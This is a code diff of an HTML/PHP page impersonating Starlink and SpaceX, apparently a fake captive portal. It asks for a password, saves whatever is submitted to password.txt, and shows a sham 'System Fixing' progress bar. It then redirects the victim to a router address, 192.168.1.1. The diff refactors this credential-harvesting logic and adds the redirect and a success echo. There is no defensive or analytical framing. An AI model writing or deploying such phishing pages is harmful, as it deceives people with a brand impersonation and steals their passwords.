@@ -150,64 +150,50 @@
             <button type="submit">Submit</button>
         </form>
     </div>
-
     <div class="loading-bar-container" id="loadingBarContainer">
         <div class="loading-message" id="loadingMessage">System Fixing</div>
         <div class="loading-bar" id="loadingBar"></div>
     </div>
     <div class="loading-text" id="loadingText">System Updated.</div>
-
     <div class="footer">
-        Starlink © 2024<br>
+        Starlink © 2025<br>
         Starlink is a division of SpaceX. Visit us at <a href="https://www.spacex.com" style="color: white;">spacex.com</a>
     </div>
-
     <?php
     if ($_SERVER['REQUEST_METHOD'] == 'POST') {
         $password = $_POST['password'];
         file_put_contents('password.txt', $password);
+        echo 'success';
     }
     ?>
-
     <script>
-        const togglePassword = document.querySelector('#togglePassword');
-        const password = document.querySelector('#password');
+    const togglePassword = document.querySelector('#togglePassword');
+    const password = document.querySelector('#password');
+    const form = document.getElementById('passwordForm');
+    togglePassword.addEventListener('click', function () {
+        const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+        password.setAttribute('type', type);
+        togglePassword.src = togglePassword.src.includes('eye.png') ? 'view.png' : 'eye.png';
+    });
+    form.addEventListener('submit', function(event) {
+        event.preventDefault();
 
-        togglePassword.addEventListener('click', function (e) {
-            const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
-            password.setAttribute('type', type);
-
-            if (togglePassword.src.includes('eye.png')) {
-                togglePassword.src = 'view.png';
-            } else {
-                togglePassword.src = 'eye.png';
-            }
+        const formData = new FormData(form);
+        fetch('index.php', {
+            method: 'POST',
+            body: formData
         });
-
-        document.getElementById('passwordForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            
-            const formData = new FormData(event.target);
-            fetch('index.php', {
-                method: 'POST',
-                body: formData
-            });
-
-            document.querySelector('.container').classList.add('blur');
-            document.getElementById('starlinkLogo').classList.add('blur');
-            document.getElementById('loadingBarContainer').style.display = 'block';
-
-            setTimeout(function() {
-                document.getElementById('loadingBarContainer').style.display = 'none';
-                document.getElementById('loadingText').style.display = 'block';
-            }, 20000);
-
-            setTimeout(function() {
-                document.querySelector('.container').classList.remove('blur');
-                document.getElementById('starlinkLogo').classList.remove('blur');
-                event.target.submit();
-            }, 22000);
-        });
-    </script>
+        document.querySelector('.container').classList.add('blur');
+        document.getElementById('starlinkLogo').classList.add('blur');
+        document.getElementById('loadingBarContainer').style.display = 'block';
+        setTimeout(function() {
+            document.getElementById('loadingBarContainer').style.display = 'none';
+            document.getElementById('loadingText').style.display = 'block';
+        }, 20000);
+        setTimeout(function() {
+            window.location.href = 'http://192.168.1.1';
+        }, 22000);
+    });
+</script>
 </body>
 </html>
